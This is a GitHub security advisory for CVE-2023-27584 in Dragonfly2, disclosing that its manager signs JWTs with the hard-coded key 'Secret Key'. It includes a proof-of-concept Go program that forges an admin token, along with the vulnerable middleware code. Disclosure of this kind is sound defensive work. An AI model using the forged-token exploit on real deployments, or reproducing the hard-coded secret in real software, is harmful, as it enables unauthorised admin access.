# [C] Dragonfly2 has hard coded cyptographic key

## Summary
Severity: Critical
Advisory: GHSA-hpc8-7wpm-889w
CVE: CVE-2023-27584
CWE: CWE-321, CWE-798
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-09-19
Source: https://github.com/advisories/GHSA-hpc8-7wpm-889w
Type: github-advisory

## Affected
- Go: `d7y.io/dragonfly/v2` — affected >=2.1.0-alpha.0 <2.1.0-beta.1
- Go: `d7y.io/dragonfly/v2` — affected >=0 <2.0.9-rc.2

## Details
### Summary
Hello dragonfly maintainer team, I would like to report a security issue concerning your JWT feature. 

### Details
Dragonfly uses  [JWT](https://github.com/dragonflyoss/Dragonfly2/blob/cddcac7e3bdb010811e2b62b3c71d9d5c6749011/manager/middlewares/jwt.go) to verify user. However, the secret key for JWT, "Secret Key", is hard coded, which leads to authentication bypass
```go
authMiddleware, err := jwt.New(&jwt.GinJWTMiddleware{
		Realm:       "Dragonfly",
		Key:         []byte("Secret Key"),
		Timeout:     2 * 24 * time.Hour,
		MaxRefresh:  2 * 24 * time.Hour,
		IdentityKey: identityKey,

		IdentityHandler: func(c *gin.Context) any {
			claims := jwt.ExtractClaims(c)

			id, ok := claims[identityKey]
			if !ok {
				c.JSON(http.StatusUnauthorized, gin.H{
					"message": "Unavailable token: require user id",
				})
				c.Abort()
				return nil
			}

			c.Set("id", id)
			return id
		})
```

### PoC
Use code below to generate a jwt token
```go
package main

import (
	"errors"
	"fmt"
	"time"

	"github.com/golang-jwt/jwt/v4"
)

func (stc *DragonflyTokenClaims) Valid() error {
	// Verify expiry.
	if stc.ExpiresAt <= time.Now().UTC().Unix() {
		vErr := new(jwt.ValidationError)
		vErr.Inner = errors.New("Token is expired")
		vErr.Errors |= jwt.ValidationErrorExpired
		return vErr
	}
	return nil
}

type DragonflyTokenClaims struct {
	Id        int32 `json:"id,omitempty"`
	ExpiresAt int64 `json:"exp,omitempty"`
	Issue     int64 `json:"orig_iat,omitempty"`
}

func main() {
	signingKey := "Secret Key"
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, &DragonflyTokenClaims{
		ExpiresAt: time.Now().Add(time.Hour).Unix(),
		Id:        1,
		Issue:     time.Now().Unix(),
	})
	signedToken, _ := token.SignedString([]byte(signingKey))
	fmt.Println(signedToken)
}
```
And send request with JWT above , you can still get data without restriction.
<img width="1241" alt="image" src="https://user-images.githubusercontent.com/70683161/224255896-8604fa70-5846-4fa0-b1f9-db264c5865fe.png">


### Impact
An attacker can perform any action as a user with admin privileges.

## References
- https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-hpc8-7wpm-889w
- https://nvd.nist.gov/vuln/detail/CVE-2023-27584
- https://github.com/dragonflyoss/Dragonfly2/commit/e9da69dc4048bf2a18a671be94616d85e3429433
- https://github.com/dragonflyoss/dragonfly/commit/684469a31bd27d38c715c507bca9f6d2c21f9007
- https://github.com/dragonflyoss/Dragonfly2
- https://github.com/dragonflyoss/Dragonfly2/releases/tag/v2.0.9
